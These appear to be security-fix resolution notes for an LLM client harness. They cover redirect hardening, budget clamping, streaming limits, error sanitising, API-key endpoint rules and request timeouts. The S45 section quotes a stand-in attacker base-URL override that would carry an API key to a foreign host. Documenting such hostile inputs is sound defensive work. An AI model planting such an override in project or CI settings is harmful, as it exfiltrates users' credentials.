# Tranche 2-A: the model transport, budgets and where a key may go

Resolution notes for **S27, S28, S28b, S30, S31, S45** (`security-robustness.md` F10 and F13) and **C-08**
(`swarm-concurrency.md`). The tranche-1 items of the same sections (S26 `Retry-After`, S29 `Turn.PlainText`) were already
in; this only confirms them (S29 below). Every finding had a red repro (`TestSecReview_S##_*`, `TestConc_*`, skipped
unless `SLEIPNIR_REVIEW=1`); each is now a plain test under its permanent name, with the assertion unchanged, and the
edge cases around it are tests of their own. Files owned: `internal/provider/**`, `internal/cost`, `internal/config`
(S45 only), `internal/session/providers.go`, `cmd/sleipnir/provider.go`.

| Finding | Status | Main change |
|---|---|---|
| S27 redirects replay the prompt and custom headers | fixed | same-origin-only redirect policy on every client (`provider.HardenClient`) |
| S28 negative or absurd usage / cost | fixed | lenient decode, clamp `0..MaxInt32`, cost must be finite, `>= 0`, `<= $1000` else priced from tokens |
| S28b NaN / negative catalogue prices | fixed | `gateway.Parse` and `Vet` validate; `cost.Model.Validate`, `Table.Put` refuses |
| S30 unbounded streaming | fixed | `provider.StreamLimits` enforced in the SSE reader and both accumulators |
| S31 uncapped, unsanitised error text | fixed | `provider.SanitizeText`, applied where error text is built and again in `Error()` |
| S45 base URL override carries the key anywhere | fixed | `provider.CheckEndpoint`; user-only `allow_hosts` / `allow_insecure_http` |
| C-08 a silent server holds a request for ever | fixed | `provider.Watchdog` armed at send time in both adapters |
| S29 streamed reasoning in a text block | confirmed (tranche 1) | tests added in both adapters |

## Which error kind a stream-cap violation uses

`ErrServer` (`provider.LimitExceeded`, message "response exceeded the ... limit (...); the stream was cancelled"). The
agent is not editable here, so the kind has to be one it already handles well:

* `ErrServer` is retryable, and the agent discards the partial output of a failed attempt (`EvReset`) and retries a
  bounded number of times (`maxAttempts` = 6, with backoff). Every attempt is capped by the same limits, so a hostile
  server cannot make a retry more expensive than the first try; a glitching one (a runaway model) gets another chance.
* A non-retryable kind (`ErrBadRequest`, `ErrAuth`) would end the run on one glitch. `ErrContextLength` and
  `ErrThinkingBinding` trigger unrelated recoveries (compaction, thinking rewrite) that would do nothing for an oversized
  answer.

A hung endpoint is `ErrTimeout` (first attempt retryable, see C-08).

## S27. Redirects replay the prompt and custom headers

* **Cause.** `net/http` follows a redirect to another host, re-sends the body of a 307/308 and forwards every header except
  `Authorization` and `Cookie`: the whole prompt and an `X-Api-Key` went to the redirect target.
* **Fix.** `provider.SameOriginRedirects` / `HardenClient` (`internal/provider/origin.go`): a redirect is followed only
  while it stays on the scheme, host and port of the *original* request, at most 4 times. Anything else is not followed
  at all (nothing is sent to the target) and comes back as a `*provider.RedirectError` naming the target origin (never a
  path, query or credentials), converted to `ErrBadRequest` with `NoRetry` (the endpoint would answer the same again).
  `HardenClient` copies the caller's `http.Client` and composes its own policy after the caller's, so it can only get
  stricter and a caller-supplied client cannot switch the check off. Applied to `openaichat`, `anthropic` and to
  `gateway.Fetch` (the catalogue behind `sleipnir models` and cost enrichment).
* **Tests.** `openaichat.TestSec_S27_RedirectDoesNotReplayPromptOrCustomHeaders` (the repro), `redirect_test.go` (other
  origin refused without being followed, same-origin redirect followed with its body, loops end, a caller-supplied client
  cannot follow across origins, a refusal is not mistaken for a cancellation), `provider/origin_test.go`, and the same
  families for anthropic (`security_test.go`) and the gateway catalogue (`TestFetchFollowsRedirectsOnlyWithinTheOrigin`).
* **Residual.** A user who *configures* a gateway that redirects between its own hosts (cdn.example to api.example) gets
  a clear error naming the target instead of a silent hand-off; the fix is to configure the final URL.

## S28 and S28b. Budgets fail open

* **Cause.** `completion_tokens: -5000000` and `cost: -1e6` were added as they came; the catalogue accepted `"NaN"` and
  `"-0.000004"`; `spend >= limit` is false for NaN.
* **Usage (`provider/usage.go`, both adapters).** Counters decode leniently (`tokens.UnmarshalJSON` never fails, so a
  hostile counter cannot make a whole usage frame vanish, which would read as "free"), then are clamped to
  `0..MaxUsageTokens` (`MaxInt32`). A reported cost is kept only if it is finite, not negative and at most
  `MaxRequestCostUSD` ($1000); otherwise it is dropped and the request is priced from its token counts, so a hostile cost
  can neither refund nor hide spend. Zero is believed (free models exist).
* **Catalogue (`gateway`).** `Parse` keeps only entries that pass `cost.Model.Validate`; `ParseDetailed` says which
  entries were left out and why; the catalogue is bounded (32 MiB, 50,000 entries), ids must be printable. `Vet` applies
  the same checks to a copy read from disk, and `session.loadCatalog` uses it, so an edited cache file cannot smuggle in
  a price the network could not. A model whose entry was dropped is priced with `cost.Fallback`, a conservative
  estimate that still trips a budget.
* **Cost package boundary (`internal/cost`).** `Price.Validate` / `Model.Validate` (finite prices in `0..100,000` $/M,
  windows and output sizes in `0..2^30`, cache parameters non-negative, ids printable and at most 256 bytes).
  `Table.Put` now returns an error and refuses an invalid model (`NewTable` leaves it out). `Price.USD` never returns NaN
  or a negative figure: an impossible result is `+Inf`, so a budget check trips instead of never firing.
  `Price.Weights` deliberately does not repair a bad price: `rl/reward` refuses a target whose weights are NaN or
  negative (its own test pins that), so hiding the garbage there would have silently priced episodes.
* **Tests.** `openaichat.TestSec_S28_*`, `usage_test.go`, `provider/usage_test.go`, anthropic `usage_internal_test.go`,
  `gateway.TestSec_S28b_*` and `catalog_hostile_test.go` (NaN, Inf, negative, huge, hex, strings, duplicate ids, control
  characters, flood), `cost/cost_test.go`, `session` tests for the enrichment path and the tampered cache.
* **Residual.** Validation cannot know the *true* price: an in-range lie (a gateway that reports `cost: 0` while charging,
  or a catalogue that halves a price) under-reports spend. The bounds make every impossible number fail closed; an
  honest-looking wrong one needs an independent source (the provider's invoice). Budgets are enforced by the agent and the
  swarm; `BudgetUSD=0` still means unlimited there (F10's remaining items are theirs, not the transport's).

## S30. Unbounded streaming

* **Cause.** Nothing bounded a stream: 70 MiB of tiny deltas became one 65 MiB turn; one SSE line, one event count or one
  tool call's arguments had no limit; keep-alive comments reset the idle timer for ever.
* **Fix.** `provider.StreamLimits` (`limits.go`) with defaults far above legitimate traffic: 64 MiB of body, 8 MiB per
  line, 1,048,576 events, 8 MiB of answer text (and, separately, of reasoning), 512 tool calls (the agent runs at most 128 per turn and refuses
  the rest, S24, so the transport bound sits above it), 4 MiB of arguments per call,
  1,024 blocks, 30 minutes per response. `Config.Limits` overrides any of them (negative turns one off). They are enforced
  where the data is read (`provider.SSEReader`: bytes, line length, events) and where it is folded (the openaichat and
  anthropic accumulators: text, reasoning, tool calls, arguments, blocks) and at the wall clock (the watchdog's total
  deadline). A violation cancels the request (the body is closed, the connection freed) and returns
  `provider.LimitExceeded` (`ErrServer`, see the top). The non-streaming path uses `ReadCapped`, which reports an
  oversized body instead of truncating it into a parse error.
* **Tests.** `openaichat.TestSec_S30_StreamingResponseIsBounded` (the repro), `limits_test.go` (each limit alone, at its
  boundary and one past it, benign large answers that must keep working), `provider/sse_test.go`, anthropic `security_test.go`.
* **Residual.** The defaults let one attempt read up to 64 MiB; with the agent's 6 attempts a hostile endpoint costs at
  most 6 x 64 MiB of transfer per request. Lower `Config.Limits` for a tighter bound.

## S31. Error text is uncapped and unsanitised

* **Cause.** A 900 KB `error.message` became a 900,054-byte error string that reached `model.error` events and the terminal;
  ESC and OSC-52 bytes passed through.
* **Fix.** `provider.SanitizeText` (`sanitize.go`): ANSI escape sequences are removed whole (CSI, OSC including the OSC-52
  clipboard write, DCS/SOS/PM/APC, charset selection, the 8-bit C1 forms); control characters, bidirectional controls,
  zero-width and other format characters, the tag block, variation selectors, noncharacters and private-use code points are
  removed; invalid UTF-8 becomes U+FFFD; white space runs (line breaks too) become one space so a message cannot pose as
  several log lines; the result is cut at a character boundary to at most 2 KiB (`MaxErrorText`). The work is bounded by
  the cap, not the input. Applied where the adapters build error text (HTTP errors, in-band stream errors, anthropic
  `errors.go`, the gateway) and once more in `provider.Error.Error()`, so a constructor that forgot still cannot print
  a raw message. Ids and errors the gateway prints for `sleipnir models` are validated (`validID`) or sanitised.
* **Tests.** `openaichat.TestSec_S31_ErrorMessageIsCappedAndSanitised` (the repro), `errors_test.go`,
  `provider/sanitize_test.go` (+ fuzz target `FuzzSanitizeText`, one corpus entry found by it), anthropic and gateway tests.
* **Residual.** `Error.Message` on a hand-built `*provider.Error` is only sanitised when printed through `Error()`; code that
  prints `.Message` directly must call `SanitizeText`. Text an *endpoint* returns as model output (not as an error) is data
  for the agent and is not filtered here.

## S45. A base URL override carries the API key to any host, over plain http

* **Cause.** `OPENAI_BASE_URL=http://collector.attacker.example/v1` (a repository's `.envrc`, a CI setting) sent the real
  key to a stranger in clear text; the same for a `base_url` in a trusted project file.
* **Rules (`provider.CheckEndpoint`, `internal/provider/endpoint.go`).**
  1. A key travels over **https**, or over **http to a loopback address** (`localhost`, `127.0.0.0/8`, `::1`, and their
     IPv4-mapped forms; `127.1`, `0.0.0.0` and names that merely resolve to loopback are not loopback). Anything else is
     refused unless the user allowed it for that provider.
  2. A base URL that came from **the environment or a project file** must point at a host the provider is known to use (the
     built-in default of that provider name, or the URL in the user's own configuration; same host and port, scheme
     ignored), at loopback, or at a host the user listed. Otherwise the key would follow the URL to a stranger.
  3. A URL the user typed (`--base-url`) or wrote in their own configuration is theirs, subject to rule 1.
  4. Credential-bearing request headers configured for a provider (`Authorization`, `X-Api-Key`, anything named like a key,
     token, secret, password or cookie) go wherever the key goes and are held to the same rules.
* **The deliberate way through.** Two settings in the **user-level** `~/.sleipnir/config.json`, per provider:
  `allow_hosts: ["gateway.example.com", "gateway.example.com:8443"]` (host, optionally with a port; case-insensitive) and
  `allow_insecure_http: true` (a trusted LAN proxy). They are user-only: `config.Load` drops them from a project or local
  file *whether or not the project is trusted* (`config.UserOnlyPaths()`, reported as a warning), because they are how the
  user tells the harness "this key may go there" and a repository must not say that on the user's behalf. `Validate`
  rejects malformed entries (a URL, a path, a bad port) and warns about `allow_insecure_http`.
* **Refusals are messages, never silent downgrades.** Example, for `OPENAI_BASE_URL=https://collector.attacker.example/v1`:
  `refusing to send the API key from $OPENAI_API_KEY to collector.attacker.example: provider "openai" is pointed there by the
  environment variable OPENAI_BASE_URL, and that is not a host this provider is known to use (api.openai.com). ... To use it
  deliberately, allow the host in your user configuration (~/.sleipnir/config.json): {"providers":{"openai":{"allow_hosts":
  ["collector.attacker.example"]}}} or unset OPENAI_BASE_URL.` (An `http://` URL adds `"allow_insecure_http":true` to the
  suggestion.) The snippet is valid JSON and following it makes the same endpoint pass (tested). Names and hosts echoed in a
  message are sanitised.
* **Where enforced.** `cmd/sleipnir/provider.go` `resolve()` (flags, `<PROVIDER>_BASE_URL`, built-ins, user allowances read
  from the user's config only), `session.BuildProvider` (`endpointOf`: env override, project-supplied `base_url` through the
  new `Provider.BaseURLFromProject`, allowances) and, as the second line, both adapters (`Config.AllowInsecureHTTP`;
  without it a key is not sent over plain http to a non-loopback host whatever the caller did). `session.ProviderInfo`,
  which callers such as the RL policy setup turn into a client that sends the key, ignores an override that `BuildProvider`
  would refuse. `session.EnrichModel` reads a catalogue only over https or from this machine (a rewritten catalogue
  changes every budget).
* **A config entry that only tunes a built-in provider** (`{"providers":{"openai":{"allow_hosts":[...]}}}`, which is what a
  refusal suggests) now *extends* the built-in provider (its base URL, dialect, key variable, options and headers) instead
  of replacing it with one that has no base URL. An entry with its own `base_url` defines the provider outright and
  inherits nothing, in particular not the built-in key variable.
* **Tests.** `cmd/sleipnir` `TestSec_S45_BaseURLOverrideCannotSendTheKeyToAnyHost` (the repro) and
  `TestResolveKeyDestination`, `TestAProjectConfigCannotAllowItsOwnBaseURL`, `TestAMalformedUserConfigAllowsNothing`,
  `TestAllowInsecureReachesTheClient`; `provider/endpoint_test.go` (a table of about 50 endpoints: look-alike hosts,
  sibling subdomains, other ports, ports 80/443, IPv6, loopback look-alikes, listed hosts, every source; the suggested JSON
  works; sanitised echo; a fuzz target, `FuzzCheckEndpoint`, that checks no accepted URL breaks the rules);
  `config/endpoint_test.go` (user-only dropping in every project layer, provenance, validation);
  `session/providers_endpoint_test.go` (build, info, loaded-config end-to-end, credential headers, catalogue).
* **Residual.** (a) `<PROVIDER>_BASE_URL` for a provider the user's config defines is judged against the user's URL only;
  an `allow_hosts` entry is trusted as written (any port unless one is given). (b) Header credentials are found by name;
  an unusual header name that carries a secret is not protected. (c) `HTTP(S)_PROXY` from the environment is still honoured
  by the transports: https stays end-to-end encrypted through a proxy, and `http.ProxyFromEnvironment` never proxies
  loopback. (d) A project that the user *trusts* can still choose `api_key_env` (which variable is sent) for a provider whose
  URL the user configured; the key goes only to the user's own host.

## C-08. A silent provider holds a request for ever

* **Cause.** The idle watchdog started after the response headers; `http.Do` had no deadline, so a server that accepts the
  connection and never answers held the request, its governor slot, the warm gate's primer and the agent for ever.
* **Fix.** `provider.Watchdog` (`watchdog.go`) is armed just before the request is sent, in `openaichat` and `anthropic`,
  with three deadlines: **first byte** (until the first byte of the response *body*; headers alone do not count, because
  marketplaces commonly send headers with the first byte), **idle** (between two reads that returned data; keep-alive
  comments and pings count) and **total** (`StreamLimits.MaxDuration`). Defaults are generous: 120 s / 60 s / 30 min for a
  stream, `RequestTimeout` 10 min for a non-streaming call. `FirstByteTimeout` defaults to `StreamIdleTimeout` when only the
  latter is set, so one setting bounds a silent server as well as a stalled stream (this is what the repro's
  `StreamIdleTimeout: 200ms` exercises). All are configurable: `Config.FirstByteTimeout / StreamIdleTimeout /
  RequestTimeout` and `Config.Limits.MaxDuration`, and in a provider's `options`: `first_byte_timeout_sec`,
  `stream_idle_timeout_sec`, `stream_timeout_sec` (the whole of one streamed response; raise it for a slow self-hosted model
  that writes very long answers) and `request_timeout_sec` (both dialects; at most a day). Expiry is `provider.ErrTimeout`; a
  caller that cancelled gets its own cancellation, not a timeout.
* **Retry cap (needed for the repro).** The agent retries a `Retryable()` failure up to 6 times, so a server that swallows
  every request would hold a run for 6 first-byte deadlines (6 x 200 ms = 1.2 s > the repro's 900 ms bound, and 12 minutes
  at the defaults). `provider.Error.NoRetry` (new; `Retryable()` honours it) and `MaxSilentAttempts = 2`: the watchdog counts,
  on the `*Request` the agent reuses across retries, the attempts that got no byte at all. The first is an ordinary
  retryable `ErrTimeout`; the second is the same error marked `NoRetry` ("2 attempts of this request got no response; not
  retrying"). A stalled *stream* (bytes arrived, then silence) is not counted and stays fully retryable, and a request that
  did get bytes resets the count.
* **Agent edit.** The only change under `internal/agent`: the test `TestConc_HungRequestIsNotBoundedByAnyTimeout` lost its
  `concGate` call and became `TestConc_HungRequestIsBoundedByTheFirstByteDeadline` (assertion unchanged: the run ends
  within 900 ms).
* **Tests.** the repro; `provider/watchdog_test.go` (first byte, idle, total, switch at the first byte, progress moves the
  deadline, Stop, silent counting); `openaichat/timeout_test.go` and anthropic equivalents (silent server, headers without a
  body, stall mid-stream, keep-alives keep it alive, caller cancellation, non-stream deadline, config defaults, retry cap).
* **Residual.** The swarm's `Governor` slot still has no maximum hold of its own (C-08's second suggestion is in
  `internal/swarm`, not here): with these deadlines a slot is held at most 30 minutes by a server that trickles a byte
  inside every idle window, and about 4 minutes by one that says nothing at all (2 x 120 s). A legitimate response that
  takes longer than `stream_timeout_sec` (a very long answer from a slow model) is cut and retried; raise the option for such
  a model.

## S29. Streamed reasoning must not become answer text (confirmation)

`Turn.PlainText` (tranche 1) leaves thinking blocks out. The adapters were checked too, and tests now pin it: streamed
reasoning only ever produces `core.BlockThinking` blocks, never a text block, and `Turn.PlainText()` is exactly the answer.
openaichat: `TestStreamedReasoningIsNeverPartOfTheAnswerText` (`reasoning` and `reasoning_content` deltas, with a
JSON-shaped marker a parser would pick up), `TestReasoningDetailsStayInsideTheThinkingBlock` (`reasoning_details` items are
kept verbatim, signature included, in the thinking block's wire form), `TestNonStreamingReasoningIsSeparatedToo`.
anthropic: `TestStreamedThinkingIsNeverPartOfTheAnswerText` (`thinking_delta` and `signature_delta`).

## Not done here (belongs to another owner)

* **swarm / agent (F10 remainder, C-08 second half).** A maximum hold time on a `Governor` slot; non-zero default budgets,
  the `!(spend < budget)` comparison and a per-task budget for mail wake-ups. The transport now hands them figures that are
  finite and never negative (`Price.USD` is `+Inf` rather than NaN), but the breakers themselves are theirs.
* **rl/harness.** `Harness.policy` builds its own `config.Config` holding only the policy provider, so a user's
  `allow_insecure_http` / `allow_hosts` for it are not visible: a policy server on a plain-http LAN address *with an API key*
  now fails fast with a message that points at a setting the harness does not read. https, loopback and key-less servers are
  unaffected. The harness should copy the allowances from the user's provider of the same name (or take a flag).
* **docs.** There is no configuration reference; the new user-only settings and the timeout options are described only in the
  code comments (`config.Provider`, `session.buildAnthropic`) and here.
* **agent (optional).** Stream-cap violations use `ErrServer` (see the top). If a dedicated kind is preferred later
  (for example one the agent reports at once instead of retrying), `provider.LimitExceeded` is the single place to change.

## Behaviour and API changes other code should know

* `cost.Table.Put` returns an `error` and refuses invalid models; `cost.NewTable` leaves them out; `cost.Model.Validate` and
  `cost.Price.Validate` are new; `Price.USD` returns `+Inf` instead of NaN/negative.
* `provider.Error` has `NoRetry`; `Retryable()` honours it; `Error()` prints sanitised, capped text. `provider.LimitExceeded`,
  `RedirectError`, `InsecureKeyError`, `EndpointError` are new. A caller that retries must keep passing the same
  `*provider.Request` (the agent does) for the silent-attempt cap to work.
* `openaichat.Config` and `anthropic.Config` gain `FirstByteTimeout`, `RequestTimeout`, `Limits`, `AllowInsecureHTTP`.
  `StreamIdleTimeout` existed with a 120 s default; the default is now 60 s in both (the first byte has its own 120 s
  deadline, and a provider's `options.stream_idle_timeout_sec` raises it). A non-loopback `http://` endpoint with an API key
  now fails the request (`ErrBadRequest`, `NoRetry`, message says how to allow it) unless `AllowInsecureHTTP`.
* Config: `providers.<name>.allow_hosts`, `allow_insecure_http` (user-level file only); `config.Provider.BaseURLFromProject`
  (`json:"-"`, set by `Load`); `config.UserOnlyPaths()`. The pinned Provider field list in `config_test.go` was extended.
* `session.ProviderInfo` and `BuildProvider` refuse (or ignore, for `ProviderInfo`) an override that would carry a key
  to an unknown host; `session.LookupProvider` extends a built-in when the entry has no `base_url`.
* `gateway.Parse` drops invalid entries (it used to accept them); new `gateway.Vet`, `ParseDetailed`, `MaxCatalogueBytes`,
  `MaxCatalogueEntries`.
* Users with a key sent to a LAN `http://` proxy, or a `<PROVIDER>_BASE_URL` pointing at a non-default host, will now see
  a refusal that tells them the one-line configuration to add.

## Declared cache events

None. No stable prompt layer, tool list, request body or header changed: the changes are on the response side, in error
handling and in configuration.
